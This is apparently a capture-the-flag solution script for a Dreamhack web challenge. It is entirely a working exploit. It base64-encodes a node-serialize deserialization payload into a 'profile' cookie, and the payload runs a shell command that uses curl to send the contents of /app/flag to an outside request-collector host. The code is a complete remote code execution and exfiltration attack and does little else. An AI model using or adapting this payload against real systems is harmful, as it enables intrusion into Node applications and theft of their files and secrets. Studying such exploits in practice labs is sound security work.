import requests, base64

port = 10041
url_index = f"http://host3.dreamhack.games:{port}/"

# {"rce":"_$$ND_FUNC$$_function (){ <이 부분에 원하는 js 코드 삽입> }()"}
exploit_msg = b"{\"rce\":\"_$$ND_FUNC$$_function (){ require('child_process').exec(' curl https://vangdng.request.dreamhack.games/ -d $(cat /app/flag) '); }()\"}"

cookie = {"profile": base64.b64encode(exploit_msg).decode("utf-8")}

r = requests.get(url_index, cookies=cookie)
# 결과 보낸 사이트 가서 확인
